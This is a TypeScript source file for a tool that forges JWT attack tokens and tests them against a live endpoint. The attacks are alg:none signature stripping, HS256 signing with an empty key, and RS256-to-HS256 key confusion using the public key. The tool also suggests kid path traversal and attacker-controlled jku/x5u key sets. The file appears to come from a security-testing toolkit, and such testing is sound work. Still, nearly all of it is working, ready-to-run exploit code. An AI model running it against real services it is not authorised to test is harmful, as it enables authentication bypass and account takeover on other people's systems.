/** `jwt_forge` — auto-forge JWT confusion tokens and VERIFY them live.
 *
 *  Complements `jwt_analyze` (which parses + enumerates the forge vectors):
 *  this tool actually FORGES the attack tokens and, when an endpoint is given,
 *  sends each one to prove which (if any) is accepted. A JWT hit is only
 *  report-ready when a forged token is ACCEPTED (status < 400) — never from
 *  the header analysis alone.
 */
import { createHmac } from "node:crypto";

function b64url(buf: Buffer | string): string {
  return Buffer.from(buf).toString("base64").replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

function b64urlDecode(s: string): Buffer {
  let t = s.replace(/-/g, "+").replace(/_/g, "/");
  while (t.length % 4) t += "=";
  return Buffer.from(t, "base64");
}

function signHS256(data: string, secret: string): string {
  return b64url(createHmac("sha256", secret).update(data).digest());
}

interface Forged {
  attack: string;
  token: string;
  note: string;
}

export interface JwtForgeResult {
  status: "ok" | "error";
  message?: string;
  header?: Record<string, unknown>;
  forged: Array<Forged & { status?: number; accepted?: boolean }>;
}

export async function jwtForge(opts: {
  token: string;
  endpoint?: string;
  method?: string;
  header?: string;
  token_prefix?: string;
  public_key?: string;
}): Promise<JwtForgeResult> {
  const token = opts.token.trim();
  const parts = token.split(".");
  if (parts.length < 2) return { status: "error", message: "not a JWT (expected header.payload.signature)", forged: [] };

  let header: Record<string, unknown>;
  let payload: string;
  try {
    header = JSON.parse(b64urlDecode(parts[0]).toString());
    payload = parts[1];
  } catch {
    return { status: "error", message: "malformed JWT header/payload", forged: [] };
  }

  const alg = String(header.alg ?? "HS256");
  const forged: Array<Forged & { status?: number; accepted?: boolean }> = [];

  // 1. alg:none — drop the signature entirely
  const noneHeader = b64url(JSON.stringify({ ...header, alg: "none" }));
  forged.push({ attack: "alg_none", token: `${noneHeader}.${payload}.`, note: "set alg=none, remove signature" });

  // 2. HS256 with empty key
  const hsHeader = b64url(JSON.stringify({ ...header, alg: "HS256" }));
  const hsData = `${hsHeader}.${payload}`;
  forged.push({ attack: "hs256_empty_key", token: `${hsData}.${signHS256(hsData, "")}`, note: "RS256→HS256 signed with empty secret" });

  // 3. HS256 with the public key (the classic key-confusion attack)
  if (opts.public_key) {
    forged.push({ attack: "hs256_public_key", token: `${hsData}.${signHS256(hsData, opts.public_key)}`, note: "RS256→HS256 signed with the PUBLIC key as HMAC secret" });
  }

  // 4. If the token already uses HS256, hint at the kid/jku/x5u vectors
  if (/HS/i.test(alg)) {
    if (header.kid) forged.push({ attack: "kid_traversal", token: "", note: `kid='${header.kid}' — try path traversal (../../dev/null) or an attacker JWKS via jku/x5u` });
    else if (!header.jku && !header.x5u) forged.push({ attack: "kid_jku_x5u", token: "", note: "no kid/jku/x5u — add one to point at an attacker-controlled JWKS" });
  }

  // Verify each forgeable token against the endpoint (optional)
  if (opts.endpoint) {
    const method = (opts.method ?? "GET").toUpperCase();
    const headerName = opts.header ?? "Authorization";
    const prefix = opts.token_prefix ?? "Bearer ";
    for (const f of forged) {
      if (!f.token) continue;
      try {
        const res = await fetch(opts.endpoint, {
          method,
          headers: { [headerName]: `${prefix}${f.token}` },
          redirect: "manual",
        });
        f.status = res.status;
        f.accepted = res.status < 400;
      } catch (e) {
        f.status = -1;
        f.accepted = false;
      }
    }
  }

  return { status: "ok", header, forged };
}
